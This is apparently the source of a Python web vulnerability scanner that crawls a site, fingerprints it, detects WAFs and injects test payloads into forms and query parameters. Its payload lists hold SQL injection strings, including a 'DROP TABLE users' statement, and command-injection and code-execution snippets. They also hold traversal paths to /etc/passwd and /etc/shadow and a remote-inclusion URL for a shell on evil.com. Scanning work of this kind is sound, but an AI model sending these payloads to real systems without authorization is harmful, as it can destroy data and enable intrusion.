#!/usr/bin/env python3

import argparse
import json
import logging
import re
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
import sys
import time
import threading
from pathlib import Path
from typing import Dict, List, Tuple, Set, Any
from urllib.parse import urlparse, urljoin
import random
import csv
from collections import OrderedDict

def clean_ansi(s: str) -> str:
    return ANSI_RE.sub("", s)
try:
    from colorama import init, Fore, Back, Style
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class DummyColor:
        GREEN = "\033[32m"
        RED = "\033[31m"
        YELLOW = "\033[33m"
        CYAN = "\033[36m"
        MAGENTA = "\033[35m"
        RESET_ALL = "\033[0m"
    Fore = DummyColor()
    init = lambda: None
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    class DummyTqdm:
        def __init__(self, *args, **kwargs):
            pass
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass
        def update(self, n):
            pass
    tqdm = DummyTqdm
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from fake_useragent import UserAgent
from tabulate import tabulate
from bs4 import BeautifulSoup, SoupStrainer

# Configure logging
logger = logging.getLogger(__name__)

def setup_logging(debug: bool, log_file: str = None):
    """Configure logging with optional debug mode."""
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[logging.StreamHandler(sys.stdout)]
    )
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(level)
        file_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
        logging.getLogger().addHandler(file_handler)

class WebVulnScanner:
    """A class to scan web applications for common vulnerabilities."""
    
    def __init__(self, user_agents_file: str = "user_agents.json", request_delay: float = 1.0, custom_ua: str = None, proxy: str = None, passive: bool = False, no_verify: bool = False, vuln_file: str = None, max_requests: int = 500):
        self.ua = UserAgent()
        self.user_agents_file = user_agents_file
        self.vuln_file_path = vuln_file or "vulnerabilities.json"
        self.vulnerabilities = self.load_vulnerabilities()
        self.waf_indicators = self.load_waf_indicators()
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(pool_connections=100, pool_maxsize=100))
        self.session.mount('https://', HTTPAdapter(pool_connections=100, pool_maxsize=100))
        self.request_delay = request_delay
        self.active_payloads = {
            "Server-Side Template Injection (SSTI)": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
            "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "Cross-Site Request Forgery (CSRF)": [],
            "Directory Traversal": ["../../etc/passwd", "../../../../etc/shadow", "../config.php", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
            "SQL Injection": ["' OR '1'='1 -- ", "'; DROP TABLE users -- "],
            "Command Injection": ["; whoami", "| whoami"],
            "Remote Code Execution": ["; id", "| uname -a"],
            "Local File Inclusion": ["../../../etc/passwd", "../../../../etc/passwd"],
            "Remote File Inclusion": ["http://evil.com/shell.txt"],
            "JWT Vulnerabilities": ["none", "HS256", "weaksecret"],
            "Deserialization": ["O:4:\"Test\":1:{s:4:\"data\";s:4:\"test\";}"],  # PHP
            "Open Redirect": ["//evil.com", "http://evil.com"]
        }
        self.confidence_scores = {
            "SQL Injection": 0.7,
            "XSS": 0.7,
            "File Inclusion": 0.6,
            "Directory Traversal": 0.6,
            "Remote File Inclusion": 0.7,
            "Command Injection": 0.7,
            "Cross-Site Request Forgery (CSRF)": 0.4,
            "Unrestricted File Upload": 0.6,
            "Password Cracking": 0.5,
            "Session Hijacking": 0.6,
            "Broken Auth and Session Management": 0.6,
            "Remote Code Execution": 0.8,
            "Local File Inclusion": 0.6,
            "Server Side Request Forgery (SSRF)": 0.7,
            "XML External Entity (XXE) Injection": 0.7,
            "Cross-Site Script Inclusion (XSSI)": 0.6,
            "Server-Side Template Injection (SSTI)": 0.8,
            "HTML Injection": 0.6,
            "XPath Injection": 0.6,
            "Code Injection": 0.7,
            "Object Injection": 0.6,
            "Cross-Domain Scripting": 0.6,
            "HTTP Response Splitting": 0.6,
            "Buffer Overflow": 0.5,
            "Format String Attack": 0.5,
            "Command Injection (Windows)": 0.6,
            "Insecure Cryptographic Storage": 0.6,
            "Insecure Direct Object References": 0.5,
            "Insufficient Logging and Monitoring": 0.5,
            "Security Misconfiguration": 0.6,
            "Cross-Site Script Inclusion (CSSI)": 0.6,
            "Click Fraud": 0.5,
            "Broken Access Control": 0.6,
            "Clickjacking": 0.5,
            "Hidden Form Fields": 0.5,
            "Shellshock": 0.7,
            "JWT Vulnerabilities": 0.7,
            "Deserialization": 0.7,
            "Open Redirect": 0.7
        }
        self.trusted_domains = [
            "youtube.com", "youtu.be", "google.com", "fonts.googleapis.com",
            "cdnjs.cloudflare.com", "fonts.gstatic.com", "googletagmanager.com",
            "cloudfront.net", "elfsight.com", "cdn.jsdelivr.net", "ajax.googleapis.com",
            "fonts.cdnfonts.com", "stackpath.bootstrapcdn.com", "use.fontawesome.com",
            "kit.fontawesome.com", "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com"
        ]
        self.context_payloads = {
            'PHP': [
                '<?php phpinfo(); ?>',
                '<?php echo shell_exec("id"); ?>',
                '<?php system("whoami"); ?>',
                '<?php passthru("ls"); ?>'
            ],
            'Node.js': [
                'require("child_process").exec("id")',
                'process.env',
                'global.process.mainModule'
            ],
            'Python': [
                '__import__("os").system("id")',
                'exec("print(1)")'
            ],
            'Java': [
                'java.lang.Runtime.getRuntime().exec("id")',
                'new java.io.FileInputStream("/etc/passwd")'
            ]
        }
        self.custom_ua = custom_ua
        self.current_user_agent = self.get_user_agent()
        self.proxy = proxy
        self.passive = passive
        self.no_verify = no_verify
        self.verify_ssl = not no_verify
        self.requests_count = 0
        self.max_requests = max_requests
        self._req_lock = threading.Lock()
        self.waf_block_counts = {}
        self.waf_lock = threading.Lock()
        self.waf_detected = False
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}
        logger.info("Initialized with user agent: %s", self.current_user_agent)

    def _inc_requests(self, n=1):
        with self._req_lock:
            self.requests_count += n
            if self.requests_count > self.max_requests:
                raise RuntimeError("Max requests exceeded")

    def _has_db_error(self, text: str) -> bool:
        """Heuristically detect DB error messages in response text."""
        t = text.lower()
        patterns = [
            "sql syntax", "warning: mysql", "unclosed quotation mark after the character string",
            "odbc sql server driver", "psql:", "postgresql", "sqlite error", "sqlstate[", "you have an error in your sql syntax",
            "ora-", "oracle error"
        ]
        return any(p in t for p in patterns)

    def load_vulnerabilities(self) -> Dict[str, Dict[str, Any]]:
        """Load vulnerability patterns from a JSON file."""
        vuln_file = Path(__file__).parent / self.vuln_file_path
        try:
            with vuln_file.open("r", encoding="utf-8") as f:
                raw_data = json.load(f)
                vulnerabilities = {}
                for name, data in raw_data.items():
                    if isinstance(data, str):
                        vulnerabilities[name] = {'pattern': data, 'detected_by': 'heuristic'}
                    elif isinstance(data, dict):
                        vulnerabilities[name] = data
                    else:
                        logger.warning("Invalid vulnerability data for %s", name)
                # Add default severity if not present
                for name, data in vulnerabilities.items():
                    if 'severity' not in data:
                        data['severity'] = 'medium'
                return vulnerabilities
        except FileNotFoundError:
            logger.error("Vulnerability file not found: %s", vuln_file)
            sys.exit(1)
        except json.JSONDecodeError as e:
            logger.error("Invalid JSON in vulnerabilities file: %s", e)
            sys.exit(1)

    def load_waf_indicators(self) -> List[str]:
        """Load WAF indicators from a JSON file."""
        waf_file = Path(__file__).parent / "waf_indicators.json"
        default_indicators = ["access denied", "firewall", "sucuri", "block id", "cloudflare", "waf", "forbidden", "akamai", "imperva", "f5", "barracuda", "mod_security", "stackpath", "distil", "incapsula"]
        if waf_file.exists():
            try:
                with waf_file.open("r", encoding="utf-8") as f:
                    indicators = json.load(f)
                    if isinstance(indicators, list):
                        return default_indicators + indicators
                    logger.warning("Invalid format in waf_indicators.json, using defaults")
            except (FileNotFoundError, json.JSONDecodeError) as e:
                logger.warning("Failed to load waf_indicators.json: %s", e)
        return default_indicators

    def validate_input(self, target: str, base_url: str = None) -> Tuple[bool, str]:
        """Validate if the input is a valid URL or IP address, and normalize it."""
        url_pattern = r"^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]+)?(/.*)?$"
        ip_pattern = r"^(([0-9]{1,3}\.){3}[0-9]{1,3})(:[0-9]+)?(/.*)?$"
        relative_pattern = r"^(/[a-zA-Z0-9_.-]+)+/?$"

        if base_url and re.match(relative_pattern, target):
            normalized_target = urljoin(base_url, target)
            return True, normalized_target

        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        
        if re.match(url_pattern, target) or re.match(ip_pattern, target):
            return True, target
        return False, target

    def get_user_agent(self) -> str:
        """Get a random user agent from file or fake-useragent."""
        if self.custom_ua:
            return self.custom_ua
        user_agents_file = Path(__file__).parent / self.user_agents_file
        if user_agents_file.exists():
            try:
                with user_agents_file.open("r", encoding="utf-8") as f:
                    user_agents = json.load(f)
                    if isinstance(user_agents, list) and user_agents:
                        return random.choice(user_agents)
            except (json.JSONDecodeError, IOError) as e:
                logger.warning("Failed to load user agents from %s: %s", user_agents_file, e)
        return self.ua.random

    def scan_target(self, target: str, base_url: str = None) -> Tuple[int, str, str, Dict]:
        """Fetch the target URL and return HTTP status code, response text, failed URL, and headers."""
        is_valid, normalized_target = self.validate_input(target, base_url)
        if not is_valid:
            return 0, "", target, {}

        headers = {"User-Agent": self.current_user_agent}
        try:
            time.sleep(self.request_delay)
            response = self.session.get(
                normalized_target, headers=headers, timeout=10, verify=self.verify_ssl
            )
            self._inc_requests()
            return response.status_code, response.text, None, response.headers
        except requests.exceptions.SSLError as e:
            logger.debug("SSL verification failed for %s: %s", normalized_target, e)
            return 0, "", normalized_target, {}
        except requests.exceptions.RequestException as e:
            logger.debug("Failed to connect to %s: %s", normalized_target, e)
            self.current_user_agent = self.get_user_agent()
            logger.debug("Rotated user agent to: %s", self.current_user_agent)
            return 0, "", normalized_target, {}

    def is_waf_response(self, text: str) -> bool:
        """Check if the response is from a WAF block page."""
        text_lower = text.lower()
        return any(indicator in text_lower for indicator in self.waf_indicators)

    def _handle_response(self, name: str, response, payload: str, method: str, target: str) -> List[Tuple[str, str, float, str]]:
        """Handle response for a specific vulnerability."""
        matches = []
        text_lower = response.text.lower()
        if self.is_waf_response(text_lower):
            with self.waf_lock:
                self.waf_block_counts[name] = self.waf_block_counts.get(name, 0) + 1
            logger.debug("WAF blocked %s test: %s %s", name, method, response.url)
            return matches  # Skip

        if name == "Server-Side Template Injection (SSTI)" and "49" in response.text:
            matches.append((response.text[:120], f"Active SSTI test: {payload} -> 49", 0.9, "Active"))
        elif name == "XSS" and payload in response.text:
            matches.append((response.text[:120], f"Active XSS test: {payload} reflected", 0.9, "Active"))
        elif name == "SQL Injection":
            if self._has_db_error(response.text) and 500 <= response.status_code < 600:
                matches.append((response.text[:120], f"Active SQLi test: {payload} caused database error", 0.8, "Active"))
        elif name in ["Command Injection", "Remote Code Execution"] and any(cmd_out in response.text.lower() for cmd_out in ['uid=', 'root', 'bin/bash', 'whoami']):
            matches.append((response.text[:120], f"Active {name} test: {payload} executed", 0.8, "Active"))
        elif name in ["Local File Inclusion", "Remote File Inclusion"] and any(sensitive in response.text.lower() for sensitive in ['root:', '/etc/passwd', '/etc/shadow']):
            matches.append((response.text[:120], f"Active {name} test: {payload} included file", 0.8, "Active"))
        elif name == "JWT Vulnerabilities" and 'eyJ' in response.text:
            matches.append((response.text[:120], f"Active JWT test: Potential weak token with {payload}", 0.7, "Active"))
        elif name == "Deserialization":
            deser_patterns = [
                r'warning: unserialize\(',
                r'fatal error:.*unserialize',
                r'call stack.*unserialize'
            ]
            has_error = any(re.search(p, text_lower) for p in deser_patterns)
            payload_reflected = payload[:10] in response.text if len(payload) > 10 else payload in response.text
            if (has_error or payload_reflected) and response.status_code >= 400:
                matches.append((response.text[:120], f"Active Deserialization test: {payload} triggered", 0.7, "Active"))
        elif name == "Open Redirect":
            original_host = urlparse(target).netloc
            final_host = urlparse(response.url).netloc
            was_redirect = any(300 <= r.status_code < 400 for r in response.history)
            host_changed = final_host != original_host
            evil_in_target = 'evil.com' in final_host.lower()
            if was_redirect and host_changed and evil_in_target:
                location = response.history[-1].headers.get('Location', '') if response.history else ''
                matches.append((response.text[:120], f"Active Open Redirect test: {payload} redirected via {location}", 0.8, "Active"))
        return matches

    def _test_post_forms(self, target: str, soup: BeautifulSoup, payloads: List[str], name: str) -> List[Tuple[str, str, float, str]]:
        """Test payloads via POST to forms."""
        matches = []
        for form in soup.find_all('form')[:2]:
            action = form.get('action') or ''
            if not action.startswith(('http://', 'https://')):
                action = urljoin(target, action)
            params = [
                inp.get('name') for inp in form.find_all('input')
                if inp.get('name') and inp.get('type') not in ['hidden', 'submit']
            ]
            if not params:
                continue
            target_param = params[0]
            base_inputs = {p: "test" for p in params}
            for payload in payloads[:3]:  # Limit payloads
                inputs = base_inputs.copy()
                inputs[target_param] = payload
                try:
                    time.sleep(self.request_delay)
                    response = requests.post(action, data=inputs, timeout=5, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None, verify=self.verify_ssl)
                    self._inc_requests()
                    logger.debug("Active %s test: POST %s with %s, Response: %s", name, action, inputs, response.text[:200])
                    matches.extend(self._handle_response(name, response, payload, "POST", target))
                except requests.RequestException as e:
                    logger.debug("Active %s test failed: %s", name, e)
        return matches

    def _test_get_params(self, target: str, payloads: List[str], name: str) -> List[Tuple[str, str, float, str]]:
        """Test payloads via GET parameters."""
        matches = []
        common_params = ['q', 'id']
        for param in common_params:
            for payload in payloads[:3]:  # Limit
                test_url = f"{target}?{param}={payload}"
                try:
                    time.sleep(self.request_delay)
                    response = requests.get(test_url, timeout=5, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None, verify=self.verify_ssl)
                    self._inc_requests()
                    logger.debug("Active %s test: GET %s, Response: %s", name, test_url, response.text[:200])
                    matches.extend(self._handle_response(name, response, payload, "GET", target))
                except requests.RequestException as e:
                    logger.debug("Active %s test failed: %s", name, e)
        return matches

    def detect_waf(self, target: str) -> bool:
        """Perform a pre-scan to detect WAF presence."""
        is_valid, normalized_target = self.validate_input(target)
        if not is_valid:
            logger.warning("Invalid target for WAF detection: %s", target)
            return False

        test_url = f"{normalized_target}?test=../../etc/passwd"
        headers = {"User-Agent": self.current_user_agent}
        try:
            time.sleep(self.request_delay)
            response = self.session.get(test_url, timeout=5, verify=self.verify_ssl, headers=headers)
            self._inc_requests()
            logger.debug("WAF pre-scan: GET %s, Response: %s", test_url, response.text[:200])
            if self.is_waf_response(response.text):
                logger.warning("WAF detected at %s", target)
                return True
            return False
        except requests.RequestException as e:
            logger.debug("WAF pre-scan failed: %s", e)
            return False

    def crawl_pages(self, target: str, max_pages: int = 5) -> List[Tuple[str, int, str, Dict]]:
        """Crawl linked pages up to a maximum limit."""
        is_valid, normalized_target = self.validate_input(target)
        if not is_valid:
            logger.error("Invalid target URL: %s", target)
            sys.exit(1)

        results = []
        visited: Set[str] = set()
        to_visit = [normalized_target]
        domain = urlparse(normalized_target).netloc
        invalid_urls: Set[str] = set()

        common_paths = [
            "/dashboard", "/admin", "/settings", "/api", "/logout",
            "/admin/index.php", "/admin/settings.php", "/admin/api",
            "/admin/queries.php", "/admin/groups.php", "/admin/dns_records.php"
        ]
        for path in common_paths:
            full_url = urljoin(normalized_target, path)
            is_valid, full_url = self.validate_input(full_url, normalized_target)
            if is_valid and full_url not in to_visit and full_url not in visited:
                to_visit.append(full_url)
            elif not is_valid:
                invalid_urls.add(full_url)

        if HAS_TQDM:
            pbar = tqdm(total=max_pages, desc="Crawling pages")
        else:
            pbar = None
        while to_visit and len(visited) < max_pages:
            current_url = to_visit.pop(0)
            is_valid, current_url = self.validate_input(current_url, normalized_target)
            if not is_valid or current_url in visited:
                if not is_valid:
                    invalid_urls.add(current_url)
                continue

            status_code, content, failed_url, headers = self.scan_target(current_url, base_url=normalized_target)
            if failed_url:
                invalid_urls.add(failed_url)
                continue
            if status_code != 200:
                logger.debug("Skipping %s (HTTP %d)", current_url, status_code)
                continue

            results.append((current_url, status_code, content, headers))
            visited.add(current_url)
            if pbar:
                pbar.update(1)

            soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer('a'))
            links = [
                urljoin(current_url, a.get('href'))
                for a in soup.find_all('a', href=True)
                if urlparse(urljoin(current_url, a.get('href'))).netloc == domain
            ]

            js_soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer('script'))
            for script in js_soup.find_all('script'):
                if script.string:
                    routes = re.findall(r'[\'"](/[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+/?)[\'"]', script.string)
                    for route in routes:
                        full_url = urljoin(normalized_target, route)
                        is_valid, full_url = self.validate_input(full_url, normalized_target)
                        if is_valid and not re.match(r'^https?://[a-zA-Z0-9_-]+$', full_url) and full_url not in visited and full_url not in to_visit:
                            to_visit.append(full_url)
                        elif not is_valid:
                            invalid_urls.add(full_url)

            for link in links:
                is_valid, link = self.validate_input(link, normalized_target)
                if is_valid and link not in visited and link not in to_visit and len(visited) + len(to_visit) < max_pages:
                    to_visit.append(link)
                elif not is_valid:
                    invalid_urls.add(link)

        if pbar:
            pbar.close()
        logger.info("Crawled %d pages: %s", len(results), ", ".join(visited))
        if invalid_urls:
            logger.warning("Skipped %d invalid URLs: %s", len(invalid_urls), ", ".join(sorted(invalid_urls)[:5]) + ("..." if len(invalid_urls) > 5 else ""))
        return results

    def active_scan(self, target: str, soup: BeautifulSoup, name: str, headers: Dict[str, str]) -> List[Tuple[str, str, float, str]]:
        """Perform active scanning by injecting payloads and analyzing responses."""
        matches = []
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        parsed_url = urlparse(target)
        domain = parsed_url.netloc or parsed_url.path
        if not domain:
            logger.warning("Invalid target URL for active scanning: %s", target)
            return matches
        normalized_target = f"https://{domain}" if not target.startswith(("http://", "https://")) else target
        
        if self.waf_detected and name == "Directory Traversal":
            logger.warning("Skipping active %s tests due to WAF detection", name)
            return matches

        # Detect context from headers
        x_powered = headers.get('X-Powered-By', '').lower()
        server = headers.get('Server', '').lower()
        context = 'general'
        if 'php' in x_powered:
            context = 'PHP'
        elif 'node' in x_powered or 'node.js' in x_powered:
            context = 'Node.js'
        elif 'python' in x_powered or 'django' in x_powered:
            context = 'Python'
        elif 'java' in server or 'tomcat' in server:
            context = 'Java'

        # Get payloads and extend with context-aware
        payloads = list(self.active_payloads.get(name, []))
        if context in self.context_payloads:
            payloads.extend(self.context_payloads[context])

        if name in ["Server-Side Template Injection (SSTI)", "XSS", "SQL Injection", "Command Injection", "Remote Code Execution", "Local File Inclusion", "Remote File Inclusion", "JWT Vulnerabilities", "Deserialization", "Open Redirect"]:
            matches.extend(self._test_post_forms(normalized_target, soup, payloads, name))
            matches.extend(self._test_get_params(normalized_target, payloads, name))

        elif name == "Cross-Site Request Forgery (CSRF)":
            forms = soup.find_all('form')
            for form in forms[:2]:
                if form.get('method', '').lower() == 'post':
                    action = form.get('action') or ''
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(normalized_target, action)
                    inputs = {
                        inp.get('name'): "test"
                        for inp in form.find_all('input')
                        if inp.get('name') and inp.get('type') != 'hidden'
                    }
                    try:
                        time.sleep(self.request_delay)
                        response = requests.post(action, data=inputs, timeout=5, proxies=proxies, verify=self.verify_ssl)
                        self._inc_requests()
                        logger.debug("Active CSRF test: POST %s with %s, Response: %s", action, inputs, response.text[:200])
                        if response.status_code in [200, 201, 302] and "error" not in response.text.lower():
                            matches.append((response.text[:120], f"Active CSRF test: Form submission succeeded without token", 0.9, "Active"))
                    except requests.RequestException as e:
                        logger.debug("Active CSRF test failed: %s", e)
                        pass

        elif name == "Directory Traversal":
            params = ["path", "file", "dir", "resource"]
            for payload in self.active_payloads[name]:
                for param in params:
                    test_url = f"{normalized_target}?{param}={payload}"
                    try:
                        time.sleep(self.request_delay)
                        response = requests.get(test_url, timeout=5, proxies=proxies, verify=self.verify_ssl)
                        self._inc_requests()
                        response_text = response.text.lower()
                        logger.debug("Active Directory Traversal test: GET %s, Response: %s", test_url, response.text[:200])
                        if self.is_waf_response(response_text):
                            with self.waf_lock:
                                self.waf_block_counts[name] = self.waf_block_counts.get(name, 0) + 1
                            logger.debug("WAF blocked Directory Traversal test: %s", test_url)
                            continue
                        if (
                            any(keyword in response_text for keyword in ["root:x:0:0", "bin/bash", "shadow", "<?php"])
                            and re.search(r"^[a-z0-9_]+:x:[0-9]+:[0-9]+:", response.text, re.MULTILINE)
                            and not response.text.strip().startswith("<!DOCTYPE html")
                            and not "<html" in response_text[:100]
                        ) or (
                            "hosts" in response_text and "127.0.0.1" in response_text
                        ):
                            matches.append((
                                response.text[:120],
                                f"Active Directory Traversal test: {param}={payload} exposed sensitive file",
                                0.9,
                                "Active"
                            ))
                    except requests.RequestException as e:
                        logger.debug("Active Directory Traversal test failed for %s: %s", name, e)
                        pass





        return matches

    def check_vulnerability(self, args: Tuple[str, Dict[str, Any], str, BeautifulSoup, str, Dict]) -> Tuple[str, str, List[Tuple[str, str, float, str]], str, str]:
        """Check a single vulnerability with passive and active scanning."""
        name, vuln_data, content, soup, target, headers = args
        if not headers:
            headers = {}
        conf = self.confidence_scores.get(name, 0.5)
        detected_by = vuln_data.get('detected_by', 'heuristic')
        severity = vuln_data.get('severity', 'medium')
        pattern = vuln_data.get('pattern')
        if not isinstance(pattern, str) or not pattern:
            logger.warning("Invalid pattern for vulnerability %s, skipping", name)
            return (name, Fore.YELLOW + "No pattern" + Style.RESET_ALL, [], detected_by, severity)
        try:
            compiled_pattern = re.compile(pattern, re.IGNORECASE)
            matches = []
            csp_present = headers.get('Content-Security-Policy', '').lower() != ''
            
            if name == 'Cross-Site Request Forgery (CSRF)':
                for form in soup.find_all('form'):
                    form_str = str(form)
                    if compiled_pattern.search(form_str):
                        token_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\'](?:authenticity_token|_csrf|csrf_token)["\'][^>]*>'
                        has_token = bool(re.search(token_pattern, form_str, re.IGNORECASE))
                        if not has_token:
                            match = form_str if len(form_str) <= 200 else form_str[:197] + "..."
                            matches.append((form_str[:120], match, conf, "Passive"))
            elif name == 'Directory Traversal':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(attr in content[max(0, match.start() - 20):match.start()].lower() for attr in ['href="', 'href=\'', 'src="', 'src=\'', 'value="', 'value=\''])
                ]
            elif name == 'Cross-Domain Scripting':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                    and not match.group(0).startswith(('<script src="/', '<script src="//'))
                    and re.match(r'<script\s+src=["\'][^\'"]*["\']\s*>', match.group(0))
                    and '://' in match.group(0)
                ]
            elif name == 'Cross-Site Script Inclusion (CSSI)':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                    and '://' in match.group(0)
                ]
            elif name == 'XSS':
                xss_patterns = [
                    r'<script\s*>.*?\b(document\.write|eval|setTimeout|setInterval)\s*\(.*?<\\/script>',
                    r'<[^>]+(on(?:click|load|mouseover|submit|error|focus|blur|change|input|keydown|keypress|keyup|mousedown|mousemove|mouseout|mouseup))=[\'"].*?[\'"]',
                    r'<script\s*>.*?[\'"]javascript:[^\'"]*[\'"].*?</script>',
                    r'<script\s*>.*?[<"][^>]*?alert\([^>]*?\)[^<]*?[<"].*?</script>'
                ]
                for xss_pattern in xss_patterns:
                    compiled_xss = re.compile(xss_pattern, re.IGNORECASE)
                    for match in compiled_xss.finditer(content):
                        if 'on' in match.group(0) and not any(keyword in match.group(0).lower() for keyword in ['javascript:', 'eval(', 'alert(', 'document.', 'window.', 'location.']):
                            continue
                        # Exclude safe event handlers
                        if 'onclick' in match.group(0).lower() and any(safe in match.group(0).lower() for safe in ['window.', 'showpage(', 'scrollto(', 'toggle', 'hide', 'show', 'open', 'close']):
                            continue
                        if (
                            not match.group(0).startswith(('<meta', '<noscript', '<div'))
                            and not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                            and not match.group(0).startswith(('<script src="/', '<script src="./', '<script src="../'))
                            and 'w-script' not in match.group(0).lower()
                            and 'nonce=' not in match.group(0).lower()
                        ):
                            confidence = conf * (0.5 if csp_present else 1.0)
                            matches.append((
                                content[max(0, match.start() - 10):match.end() + 10],
                                match.group(0),
                                confidence,
                                "Passive"
                            ))

            else:
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                ]

            if name == 'HTML Injection':
                matches = [m for m in matches if not ('onclick' in m[1].lower() and any(safe in m[1].lower() for safe in ['window.', 'showpage(', 'scrollto(', 'toggle', 'hide', 'show', 'open', 'close']))]
            elif name == 'HTTP Response Splitting':
                matches = [m for m in matches if '\r\n' in m[1] or '%0d%0a' in m[1].lower() or '%0d' in m[1].lower()]

            matches = [
                m for m in matches
                if (len(m[1]) >= 5 or m[1] in ['exec(', 'system(']) and not m[1].isspace()
            ][:50]

            if name in self.active_payloads:
                if not self.passive:
                    active_matches = self.active_scan(target, soup, name, headers)
                else:
                    active_matches = []
            else:
                active_matches = []

            matches.extend(active_matches)

            status = Fore.GREEN + "Vulnerable" + Style.RESET_ALL if matches else Fore.RED + "Not Vulnerable" + Style.RESET_ALL
            if not matches and self.waf_block_counts.get(name, 0) > 0:
                status = Fore.YELLOW + "Inconclusive (WAF interference)" + Style.RESET_ALL
            if active_matches:
                detected_by = 'active'
            return (name, status, matches, detected_by, severity)
        except re.error as e:
            logger.warning("Invalid regex pattern for %s: %s", name, e)
            return (name, Fore.YELLOW + "Error in pattern" + Style.RESET_ALL, [], 'heuristic', severity)

    def check_vulnerabilities(self, pages: List[Tuple[str, int, str, Dict]]) -> List[Tuple[str, str, List[Tuple[str, str, float, str]], str, str]]:
        """Check vulnerabilities across multiple pages."""
        self.waf_block_counts.clear()
        agg = OrderedDict()

        for url, status_code, content, headers in pages:
            if status_code != 200:
                continue
            logger.debug("Scanning page: %s", url)
            soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer(['script', 'style', 'form', 'link']))
            
            content_cleaned = content
            if soup.find(['script', 'style']):
                for tag in soup(['script', 'style']):
                    tag.decompose()
                content_cleaned = str(soup)

            with ThreadPoolExecutor() as executor:
                tasks = [
                    (name, vuln_data, content if name in ['XSS', 'Cross-Site Script Inclusion (CSSI)', 'Cross-Domain Scripting', 'Cross-Site Request Forgery (CSRF)', 'Directory Traversal'] else content_cleaned, soup, url, headers)
                    for name, vuln_data in self.vulnerabilities.items()
                ]
                try:
                    results = list(executor.map(self.check_vulnerability, tasks))
                except RuntimeError as e:
                    if "Max requests exceeded" in str(e):
                        logger.warning("Max requests exceeded during vulnerability checks")
                        break
                    else:
                        raise

            for name, status, matches, detected_by, severity in results:
                if name not in agg:
                    agg[name] = [status, {}, detected_by, severity]  # change to dict for unique
                if matches:
                    agg[name][0] = status          # latest status
                    for match in matches:
                        key = (match[1], match[3])  # match_str, match_type
                        if key not in agg[name][1]:
                            agg[name][1][key] = (match[0], match[1], match[2], match[3], 1)
                        else:
                            # update if higher confidence, increment count
                            existing = agg[name][1][key]
                            if match[2] > existing[2]:
                                agg[name][1][key] = (match[0], match[1], match[2], match[3], existing[4] + 1)
                            else:
                                agg[name][1][key] = (existing[0], existing[1], existing[2], existing[3], existing[4] + 1)
                    agg[name][2] = detected_by     # last method that actually found something
                    agg[name][3] = severity

        for vuln, count in self.waf_block_counts.items():
            logger.warning("WAF blocked %d %s test(s) across all pages", count, vuln)

        return [
            (name, status, list(matches.values()), detected_by, severity)
            for name, (status, matches, detected_by, severity) in agg.items()
        ]

    def fingerprint(self, content: str, headers: Dict[str, str], target: str) -> Dict[str, Any]:
        """Generate a structured fingerprint of the target."""
        fingerprint = {
            'server': headers.get('Server', 'Unknown'),
            'x_powered_by': headers.get('X-Powered-By', 'Unknown'),
            'os_guess': 'Unknown',
            'programming_languages': [],
            'generator': None,
            'cms_guess': 'Unknown',
            'mediawiki_version': None,
            'wordpress_version': None,
            'joomla_version': None,
            'drupal_version': None,
            'known_vulns': [],
            'extension_vulns': [],
            'frontend_frameworks': [],
            'backend_frameworks': [],
            'cdn_services': [],
            'ecommerce_platforms': [],
            'analytics_tracking': [],
            'security_waf': [],
            'security_headers': {},
            'robots_txt': 'Unknown',
            'sitemap_xml': 'Unknown',
            'ssl_enabled': False,
            'miscellaneous': [],
            'hardening_tips': []
        }
        
        server_lower = fingerprint['server'].lower()
        if 'ubuntu' in server_lower or 'debian' in server_lower:
            fingerprint['os_guess'] = 'Linux (Ubuntu/Debian)'
        elif 'centos' in server_lower or 'red hat' in server_lower:
            fingerprint['os_guess'] = 'Linux (CentOS/Red Hat)'
        elif 'windows' in server_lower:
            fingerprint['os_guess'] = 'Windows'
        elif 'nginx' in server_lower or 'apache' in server_lower:
            fingerprint['os_guess'] = 'Linux (likely)'
        elif 'iis' in server_lower:
            fingerprint['os_guess'] = 'Windows'
        elif 'tomcat' in server_lower:
            fingerprint['os_guess'] = 'Linux/Unix (Java)'
        elif 'php' in fingerprint['x_powered_by'].lower():
            fingerprint['os_guess'] = 'Linux (PHP)'
        elif 'asp.net' in server_lower or 'asp.net' in fingerprint['x_powered_by'].lower():
            fingerprint['os_guess'] = 'Windows (ASP.NET)'
        
        # Programming Languages
